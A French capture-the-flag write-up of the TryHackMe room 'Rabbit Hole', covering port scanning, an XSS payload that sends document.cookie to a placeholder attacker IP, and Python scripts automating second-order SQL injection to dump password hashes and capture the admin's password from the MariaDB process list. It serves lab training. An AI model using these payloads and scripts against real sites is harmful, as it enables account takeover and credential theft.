---
date: 2024-10-29T19:25:05-05:00
# description: ""
image: "/images/THM-RabbitHole/RabbitHole.png"
showTableOfContents: true
tags: ["TryHackMe"]
categories: ["Writeups"]
title: "THM: Rabbit Hole"
type: "post"
---

* Platforme: TryHackMe
* Lien: [Rabbit Hole](https://tryhackme.com/r/room/rabbitholeqq)
* Niveau: Difficile
* OS: Linux
---

Ce défi met l'accent sur les vulnérabilités liées aux injections SQL. Nous découvrons une vulnérabilité d'injection SQL de second ordre après plusieurs tentatives de Cross-Site Scripting (XSS) qui échouent. En utilisant cette vulnérabilité, nous récupérons des hachages de mots de passe, mais ils ne conduisent pas à un accès initial. En combinant un script python et une payload utilisant la commande `PROCESSLIST`, nous réussissons à extraire la requête contenant le mot de passe de l'utilisateur `admin`, que nous utilisons pour nous connecter via SSH et lire le drapeau.

## Balayage

```
./nmap_scan.sh 10.10.233.57 Rabbit_Hole
```

**Results**

```shell
Running detailed scan on open ports: 22,80
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-29 18:11 CDT
Nmap scan report for 10.10.233.57
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Your page title here :)
|_http-server-header: Apache/2.4.59 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.03 seconds
```

Notre scan Nmap trouve deux ports ouverts 22 (SSH) et 80 (HTTP). En vue de faciliter notre énumération, mettons à jour le fichier `/etc/hosts` avec l'adresse IP fournie et `rabbithole.thm`.

## Enumération

À `http://rabbithole.thm/`, nous trouvons un site web pour une campagne de recrutement avec une fonction d'authentification, qui indique que "des mesures anti-bruteforce sont mises en place".

![Rabbit Hole website](/images/THM-RabbitHole/rabbit_hole_website.png)

Créons un compte et connectons-nous.

![Account registration](/images/THM-RabbitHole/rabbithole_register.png)

Sur la page de connexion, nous remarquons un message différent. Il nous indique que les mesures anti-bruteforce sont `mises en œuvre à l'aide de requêtes de base de données`

![Login page](/images/THM-RabbitHole/rabbithole_loginpage.png)

Après s'être connecté, nous trouvons une page affichant les dernières connexions des utilisateurs.

![Users last logins](/images/THM-RabbitHole/rabbithole_logins.png)

Nous ne pouvons rien faire d'autre sur cette page que de se déconnecter. Mais si nous prêtons attention aux temps de connexion pour `admin`, nous remarquons que l'utilisateur se connecte **toutes les minutes**, ce qui est étrange. De plus, notre nom d'utilisateur est reflété sur le site web, ce qui peut impliquer une possibilité d'attaques telles que XSS, SQLi, et plus encore.

Avant d'explorer les possibles vulnérabilités, énumérons un peu plus la cible.

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://rabbithole.thm
```

![Gobuster directory enumeration](/images/THM-RabbitHole/rabbithole_gobuster.png)

L'énumération des répertoires étant infructueuse, nous passons à l'énumération des sous-domaines.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://rabbithole.thm -H "Host: FUZZ.axlle.htb" -ic -fs 723
```

Celle-ci ne fournit également aucune piste.

![Ffuf subdomain enumeration](/images/THM-RabbitHole/rabbithole_ffuf.png)

Nous remarquons que la valeur de notre cookie est la même pour différentes connexions, ce qui n'est pas recommandé. Cela permettrait aux attaquants d'exécuter certaines attaques de session telles que la fixation de session et les attaques par rejeu (replay attack). Dans notre cas, cela signifie que si nous parvenons à mettre la main sur la valeur du cookie de l'administrateur, nous pourrons probablement nous connecter en son nom.

![cookie value first login](/images/THM-RabbitHole/cookievalue_loggedin.png)

![cookie value second login](/images/THM-RabbitHole/2nd_login.png)

### Tentative de XSS

Tentons un vol de cookie, puisque la valeur du paramètre `username` est reflétée, nous allons l'utiliser.

![Burp request](/images/THM-RabbitHole/burp_req.png)

Nous sommes en mesure d'enregistrer un compte avec le payload ci-dessous comme `username`.

```
<script>var i=new Image(); i.src="http://YOUR_IP:WEBSERVER_PORT/?cookie="+btoa(document.cookie);</script>
```

![Payload for username](/images/THM-RabbitHole/payload_as_username.png)

Mais la connexion avec ce compte produit une erreur. Elle révèle que l'application utilise MariaDB, une version modifiée de MySQL.

![Payload Login error](/images/THM-RabbitHole/login_error_SQLi.png)

Il semblerait que nous soyons en présence d'une **injection SQL de second ordre**. Nous avons injecté le code malveillant via notre payload lors de l'enregistrement du compte et il a été exécuté lors de la connexion. Puisque le payload n'a pas créé de problèmes lors de l'enregistrement, nous savons que le caractère `"` est celui qui pose problème ici, ce qui est une bonne chose puisqu'il nous servira pour nos SQLis ultérieures.

En vérifiant notre serveur web, nous constatons que nous avons reçu des valeurs de cookies.

![cookie value received](/images/THM-RabbitHole/cookie_value_xss.png)

Malheureusement, à chaque fois que j'essaie d'utiliser l'un d'entre eux, je suis déconnecté. Intéressons-nous maintenant à une autre voie d'attaque.

### Injection SQL de second ordre

Ce processus d'exploitation est pénible: pour tester les différents payloads SQLi, nous devons créer un nouvel utilisateur et nous connecter pour pouvoir lire les résultats de la requête, ce qui n'est pas idéal.

Nous allons donc automatiser le processus avec le script Python ci-dessous.

```python
import sys
import requests

def create_user(ip, payload):
    url = f"http://{ip}/register.php"
    data = {
        'username': payload,
        'password': 'password',
        'submit': 'Submit Query'
    }
    response = requests.post(url, data=data)
    return response.status_code == 200

def login_user(ip, payload):
    url = f"http://{ip}/login.php"
    data = {
        'username': payload,
        'password': 'password',
        'login': 'Submit Query'
    }
    response = requests.post(url, data=data)
    return response.text

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 auto_sqli.py <IP_ADDRESS> <PAYLOAD>")
        sys.exit(1)

    ip = sys.argv[1]
    payload = sys.argv[2]

    print(f"[+] Creating user with payload: {payload}")
    if create_user(ip, payload):
        print("[+] User created successfully. Attempting login...")
        response_text = login_user(ip, payload)
        print("[+] Login response:")
        print(response_text)
    else:
        print("[-] Failed to create user. Check the payload or connection.")

if __name__ == "__main__":
    main()
```

Nous utilisons notre script pour trouver le nombre de colonnes escomptées.

```
python3 auto_sqli.py IP_ADDRESS '" UNION SELECT 1; --'
```

![Second Order SQLi test](/images/THM-RabbitHole/S_SQLi_test.png)

Nous pouvons lire le message d'erreur `SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns`.

Augmentons le nombre de colonnes avec le payload suivant.

```
python3 auto_sqli.py IP_ADDRESS '" UNION SELECT 1, 2; --'
```

![Second Order SQLi test2](/images/THM-RabbitHole/S_SQLi_test2.png)

Ce payload fonctionne, confirmant que **2** colonnes sont nécessaires.

Il serait bon de savoir sur quelle base de données nous travaillons actuellement.

```
python3 auto_sqli.py IP_ADDRESS '" UNION SELECT 1, database(); --'
```

> Si vous remarquez que l'adresse IP est différente, c'est parce que j'avais perdu certaines captures d'écran et j'ai dû recommencer le processus d'exploitation avec une adresse IP différente pour les reprendre.

![Second Order SQLi test2](/images/THM-RabbitHole/current_DB.png)

Nous sommes actuellement dans la base de données `web`, nous allons maintenant énumérer ses tables.

![web database content](/images/THM-RabbitHole/S_SQLi_enum.png)

Nous découvrons deux tables `users` et `logins`, la première semble intéressante.

```
python3 auto_sqli.py IP_ADDRESS '" UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name="users" AND table_schema=DATABASE(); --'
```

![users table fields](/images/THM-RabbitHole/S_SQLi_enum2.png)

Cette table comporte quatre champs : `id`, `username`, `password`, et `group`. Nous allons d'abord vérifier `username` pour voir s'il y a d'autres utilisateurs.

```
python3 auto_sqli.py IP_ADDRESS '" UNION SELECT 1, username FROM web.users; --'
```

![username field content](/images/THM-RabbitHole/username_list.png)

En plus de `admin`, nous trouvons `foo` et `bar`. 

Listons maintenant le contenu de `password`.

```
python3 auto_sqli.py IP_ADDRESS '" UNION SELECT 1, password FROM web.users; --'
```

![incomplete hashes](/images/THM-RabbitHole/S_SQLi_enum3.png)

Nous sommes capables d'extraire les hashs mais il y a une limite de 16 caractères, ce qui donne des hashs incomplets. Afin de surmonter cet obstacle, nous modifions notre script en utilisant `SUBSTRING` pour diviser la requête en deux parties.

```python
import sys
import requests
from bs4 import BeautifulSoup

def create_user(ip, payload):
    url = f"http://{ip}/register.php"
    data = {
        'username': payload,
        'password': 'password',
        'submit': 'Submit Query'
    }
    response = requests.post(url, data=data)
    return response.status_code == 200

def login_user(ip, payload):
    url = f"http://{ip}/login.php"
    data = {
        'username': payload,
        'password': 'password',
        'login': 'Submit Query'
    }
    response = requests.post(url, data=data)
    return response.text

def extract_results(html):
    soup = BeautifulSoup(html, 'html.parser')
    results = []
    
    for td in soup.find_all('td'):
        content = td.get_text().strip()
        # Filter out timestamp entries (they start with year)
        if not content.startswith('202'):  # Assumes timestamps start with 202x
            results.append(content)
    
    return results

def modify_payload(payload, substring_range):
    select_pos = payload.upper().find('SELECT')
    from_pos = payload.upper().find('FROM')
    
    if select_pos == -1 or from_pos == -1:
        return payload
        
    select_clause = payload[select_pos:from_pos]
    rest_of_query = payload[from_pos:]
    
    columns = select_clause.replace('SELECT', '').strip().split(',')
    
    modified_columns = []
    for i, col in enumerate(columns):
        col = col.strip()
        if i == len(columns) - 1:  # Last column
            # Handle both simple columns and expressions
            col_content = col.strip('1234567890 ')  # Remove any numeric values
            if col_content:  # If there's a non-numeric column
                col = f"SUBSTRING({col}, {substring_range[0]}, {substring_range[1]})"
        modified_columns.append(col)
    
    modified_payload = payload[:select_pos] + 'SELECT ' + ', '.join(modified_columns) + ' ' + rest_of_query
    return modified_payload

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 auto_sqli.py <IP_ADDRESS> <PAYLOAD>")
        sys.exit(1)

    ip = sys.argv[1]
    original_payload = sys.argv[2]
    
    first_payload = modify_payload(original_payload, (1, 16))
    second_payload = modify_payload(original_payload, (17, 32))

    print(f"[+] Creating user with first payload: {first_payload}")
    if create_user(ip, first_payload):
        print("[+] User created successfully. Attempting first login...")
        first_response = login_user(ip, first_payload)
        first_results = extract_results(first_response)
        
        print(f"[+] Creating user with second payload: {second_payload}")
        if create_user(ip, second_payload):
            print("[+] User created successfully. Attempting second login...")
            second_response = login_user(ip, second_payload)
            second_results = extract_results(second_response)
            
            print("\n[+] Combined results:")
            for i in range(len(first_results)):
                full_result = first_results[i]
                if i < len(second_results) and second_results[i].strip():
                    full_result += second_results[i]
                print(f"  - {full_result}")
        else:
            print("[-] Failed to create user for second query.")
    else:
        print("[-] Failed to create user. Check the payload or connection.")

if __name__ == "__main__":
    main()
```

![full hashes](/images/THM-RabbitHole/full_hashes.png)

```
0e3ab8e45ac1163c2343990e427c66ff
a51e47f646375ab6bf5dd2c42d3e6181
de97e75e5b4604526a2afaed5f5439d7
```

Nous n'arrivons pas à craquer le hash `admin` et bien que nous craquions les deux autres hashs, nous ne pouvons pas utiliser les mots de passe pour nous connecter via SSH.

![cracked passwords](/images/THM-RabbitHole/foobar_pwd.png)

![failed SSH logins](/images/THM-RabbitHole/failed_SSH.png)

Nous vérifions également la table `logins` mais elle ne contient que `username` et `login_time` ce qui n'est pas utile.

```
python3 auto_sqli.py IP_ADDRESS '" UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name="logins" AND table_schema=DATABASE(); --'
```

![logins table](/images/THM-RabbitHole/logins_table.png)

Voyons quelle(s) autre(s) base(s) de données nous avons.

```
python3 auto_sqli.py IP_ADDRESS '" UNION SELECT 1, schema_name FROM information_schema.schemata; --'
```

![full databases names](/images/THM-RabbitHole/full_db_names.png)

Outre la base de données `web`, nous avons la base de données `information_schema`.

## Extraction de requêtes SQL

> Tout le mérite de cette partie revient à `jaxafed` dont l'article est disponible [ici](https://jaxafed.github.io/posts/tryhackme-rabbit_hole/#extracting-the-current-queries). Je n'ai pas été capable de faire le lien entre les connexions automatiques et la base de données.

À ce stade, nous avons épuisé un grand nombre d'options, mais il reste encore des pistes à explorer. Rappelez-vous que nous avions remarqué que l'utilisateur `admin` se connectait **toutes les minutes**, ce qui indique manifestement une sorte d'automatisation. 

Il s'avère que nous pouvons utiliser la commande `PROCESSLIST` pour voir quelles requêtes sont effectuées en arrière-plan et si notre timing est bon, le mot de passe de l'administrateur sera exposé. _Plus d'informations sur `PROCESSLIST` [ici](https://mariadb.com/kb/en/information-schema-processlist-table/)._

```python
#!/usr/bin/env python3

import requests
import sys
from bs4 import BeautifulSoup
import threading
import time

url_base = sys.argv[1]
payload = sys.argv[2]

sessions = {}
results = {}


def create_and_login(i, sqli_payload):
    s = requests.session()
    s.post(url_base + "register.php", data={"username": sqli_payload, "password": "jxf", "submit": "Submit Query"})
    s.post(url_base + "login.php", data={"username": sqli_payload, "password": "jxf", "login": "Submit Query"})
    sessions[i] = s
    return


def fetch_query_result(i):
    r = sessions[i].get(url_base)
    soup = BeautifulSoup(r.text, "html.parser")
    tables = soup.find_all("table", class_="u-full-width")
    output = tables[1].find("td").get_text()
    results[i] = output
    return


threads = []
for i in range(15):
    sqli_payload = f'" UNION SELECT 1, SUBSTR(({payload}), {i * 16 + 1}, 16);#'
    thread = threading.Thread(target=create_and_login, args=(i, sqli_payload))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

while True:
    threads = [threading.Thread(target=fetch_query_result, args=(i,)) for i in range(15)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

    # check that we are not missing any part of the result
    if all([len(results[i]) <= len(results[i - 1]) for i in range(1, 15)]):
        result = "".join([results[i] for i in range(0, 15)])
        if len(result) > 16:
            print(result)
            sys.exit(0)
            
    time.sleep(1)
```

Nous devons capturer la requête lorsque l'administrateur se connecte, c'est-à-dire toutes les minutes, ce qui peut nécessiter d'exécuter le script plusieurs fois afin d'obtenir la bonne requête.

En utilisant le script créé par `jaxafed`, nous trouvons la requête révélant le mot de passe.

```
python3 admin_sqli.py 'http://IP_ADDRESS/' 'SELECT INFO_BINARY FROM information_schema.PROCESSLIST WHERE INFO_BINARY NOT LIKE "%INFO_BINARY%" LIMIT 1'
```

![admin password retrieval](/images/THM-RabbitHole/admin_pwd_retrieval.png)

Avec le mot de passe, nous nous connectons via SSH et lisons le drapeau.

![flag location](/images/THM-RabbitHole/flag.png)

Ce défi était un casse-tête mais je l'ai vraiment apprécié, probablement parce que l'injection SQL est l'un de mes points faibles. Si vous souhaitez en apprendre davantage sur les vulnérabilités liées aux injections SQL, je vous recommande le parcours d'apprentissage sur les injections SQL de PortSwigger disponible [ici](https://portswigger.net/web-security/learning-paths/sql-injection).
